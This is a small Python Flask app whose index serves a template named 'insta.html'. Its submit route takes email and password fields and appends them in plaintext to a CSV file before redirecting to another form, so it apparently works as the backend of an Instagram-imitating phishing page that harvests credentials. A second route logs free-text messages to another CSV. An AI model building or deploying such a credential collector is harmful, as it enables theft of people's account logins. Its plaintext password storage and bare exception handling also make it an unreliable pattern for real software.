from flask import Flask, render_template, url_for, request, redirect
import csv

app = Flask(__name__)
print(__name__)


@app.route('/')
def index():
	return render_template('insta.html')

@app.route('/form.html')
def form():
	return render_template('form.html')

@app.route('/thanks.html')
def thanks():
	return render_template('thanks.html')



def write_to_csv(data):
	with open('database.csv', mode='a') as database:
		email = data["email"]
		password = data["password"]
		#message = data["message"]
		csv_writer = csv.writer(database, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
		csv_writer.writerow([email,password])

     
@app.route('/submit_form', methods=['POST', 'GET'])
def submit_form():
	if  request.method == 'POST':
		try:
		  data = request.form.to_dict()
		  write_to_csv(data)
		  return redirect('/form.html')
		except:
		  return 'Did not save to database'
	else:
		return 'something went wrong. Try again'




def write_to_csv2(data2):
	with open('message.csv', mode='a') as database2:
		#email = data2["email"]
		#password = data2["password"]
		message = data2["Message"]
		csv_writer = csv.writer(database2, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
		csv_writer.writerow([message])

     
@app.route('/submit', methods=['POST', 'GET'])
def submit_form2():
	if  request.method == 'POST':
		try:
		  data2 = request.form.to_dict()
		  write_to_csv2(data2)
		  return redirect('/thanks.html')
		except:
		  return 'Did not save to database'
	else:
		return 'something went wrong. Try again'